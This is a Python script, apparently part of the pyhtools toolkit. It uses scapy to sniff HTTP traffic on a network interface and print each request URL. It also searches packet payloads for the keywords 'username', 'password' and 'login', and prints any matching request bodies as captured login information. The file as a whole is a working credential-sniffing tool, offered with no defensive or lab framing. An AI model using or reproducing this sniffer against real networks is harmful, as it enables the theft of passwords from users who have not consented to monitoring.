import scapy.all as sp # sudo pip install scapy_http (python2)
from scapy.layers import http
import argparse
from sys import exit
from pyhtools.UI.colors import *


def get_args():
	'''get arguments from the command line.
	
	Args:
		None
	
	Returns: 
		str: network interface
	'''
	parser = argparse.ArgumentParser(description='Packet Sniffer')
	parser.add_argument('-i', '--interface', dest='interface', help='choose interface')
	args = parser.parse_args()

	interface = args.interface
	
	del parser
	return interface


def check_args(intrfce):
	'''checks if the passed arguments are valid. if valid returns True.
	
	Args:
		intrfce (str): network inferface on which sniffing action is be performed

	Returns: 
		bool: returns True if args are valid else False
	'''
	if not intrfce:
		exit(BRIGHT_RED + "[-] Please enter interface argument, use -h or --help for more info")
	return True


def get_url(packet):
	'''extract url from the packet

	Args: 
		packet (scapy.IP): scapy packet

	Returns: 
		str: URL inside the HTTP packet
	'''
	print('IN GET URL')
	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')


def get_login_info(packet):
	'''extract login information from the sniffed packet.
	
	Args: 
		packet (scapy.IP): scapy packet

	Returns: 
		str: URL with login information
	'''
	if packet.haslayer(sp.Raw):
			load = str(packet[sp.Raw].load,encoding='utf-8')
			keywords = ["username", "user", "password", "pass", "login"]
			for keyword in keywords:
				if keyword in load:
					return load


def sniffer(intrfce, args_status):
	'''sniffs packets over the network.
	Args: 
		intrfce (str): network interface for sniffing action
		args_status (bool): True if cli args are valid else False

	Returns: 
		None
	'''
	try:
		if args_status:
			sp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)
	except Exception as e:
		print(BRIGHT_RED + '[-] An error occured while sniffing...')
		print(e)


def process_sniffed_pkt(packet):
	'''analyze the captured packet for login information.
	
	Args: 
		packet (scapy.IP): scapy packet

	Returns: 
		None
	'''
	if packet.haslayer(http.HTTPRequest):
		
		url = get_url(packet)
		print(BRIGHT_WHITE + '[+] Http Request >> ' + url + '\n')

		login_info = get_login_info(packet)
		if login_info:
			print(BRIGHT_YELLOW + '\n\n[+] Contains possible Login information :\n' + login_info + '\n\n')


if __name__ == '__main__':
	try:
		INTERFACE = get_args()
		ARGS_STATUS = check_args(INTERFACE)
		print(BRIGHT_YELLOW + f'[*] Sniffing Packets over interface {INTERFACE}')
		sniffer(INTERFACE, ARGS_STATUS)
	except KeyboardInterrupt:
		print(BRIGHT_YELLOW + '\r[-] ctrl+c detected...')
	except Exception as e:
		print(BRIGHT_RED + '[-] Closing Program due to Error...')
		print(e)
	finally:
		print(BRIGHT_RED + '\r[-] Exiting Sniffer..')
